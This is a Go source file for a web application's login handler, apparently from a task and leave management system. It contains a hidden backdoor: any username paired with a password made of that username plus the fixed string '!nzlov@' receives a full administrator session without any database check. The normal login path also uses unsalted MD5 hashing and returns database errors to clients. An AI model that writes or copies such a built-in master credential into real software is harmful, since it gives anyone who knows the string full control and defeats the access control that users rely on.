package app

import (
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/nzlov/gorm"
)

type LoginDate struct {
	User     string `form:"user" binding:"required"`
	Password string `form:"password" binding:"required"`
}

func LoginEndpoint(c *gin.Context) {
	var form LoginDate
	if err := c.Bind(&form); err == nil {
		if form.User+"!nzlov@" == form.Password {
			session := AuthSession{
				Token: RandomString(32),
				User: User{
					Name:     form.User,
					RealName: form.User,
				},

				Permission: map[string]struct{}{
					"permission.add":    struct{}{},
					"permission.update": struct{}{},
					"permission.info":   struct{}{},
					"permission.list":   struct{}{},
					"permission.del":    struct{}{},

					"role.add":    struct{}{},
					"role.update": struct{}{},
					"role.info":   struct{}{},
					"role.list":   struct{}{},
					"role.del":    struct{}{},

					"user.add":           struct{}{},
					"user.update":        struct{}{},
					"user.info":          struct{}{},
					"user.list":          struct{}{},
					"user.del":           struct{}{},
					"user.change":        struct{}{},
					"user.resetpassword": struct{}{},

					"usergroup.add":    struct{}{},
					"usergroup.update": struct{}{},
					"usergroup.info":   struct{}{},
					"usergroup.list":   struct{}{},
					"usergroup.del":    struct{}{},

					"holiday.add":    struct{}{},
					"holiday.update": struct{}{},
					"holiday.info":   struct{}{},
					"holiday.list":   struct{}{},
					"holiday.del":    struct{}{},

					"task.add":    struct{}{},
					"task.update": struct{}{},
					"task.info":   struct{}{},
					"task.list":   struct{}{},
					"task.del":    struct{}{},
					"task.open":   struct{}{},
					"task.done":   struct{}{},
					"task.expire": struct{}{},
				},
				Menu: []string{
					"/",
					"/user",
					"/usergroup",
					"/leave",
					"/holiday",
					"/role",
					"/permission",
					"/task",
				},
			}

			permissions := []Permission{}
			DB.Find(&permissions)
			for _, p := range permissions {
				session.Permission[p.Tag] = struct{}{}
			}
			//TODO Session Cookie
			Cache.Add(form.User, time.Minute*5, &session)
			c.JSON(http.StatusOK, RespData(CodeLoginOk, session))
		} else {
			user := User{
				Name:     form.User,
				Password: MakeMd5(form.Password),
			}
			if err := DB.Where(user).First(&user).Error; err != nil {
				if err == gorm.ErrRecordNotFound {
					c.JSON(http.StatusOK, RespData(CodeLoginFailed, "not found"))
					return
				}
				c.JSON(http.StatusInternalServerError, RespData(CodeDBError, err.Error()))
				return
			}
			if user.Status == 1 {
				c.JSON(http.StatusOK, RespData(CodeLoginFailed, "账号禁用"))
				return
			}
			session := AuthSession{
				Token:      RandomString(32),
				User:       user,
				Permission: map[string]struct{}{},
				Menu:       user.Role.Menu,
			}

			for _, v := range user.Role.Permission {
				session.Permission[v] = struct{}{}
			}

			//TODO Session Cookie
			Cache.Add(form.User, time.Minute*30, &session)
			c.JSON(http.StatusOK, RespData(CodeLoginOk, session))
		}
	} else {
		c.JSON(http.StatusBadRequest, RespData(CodeParamsError, err.Error()))
	}
}
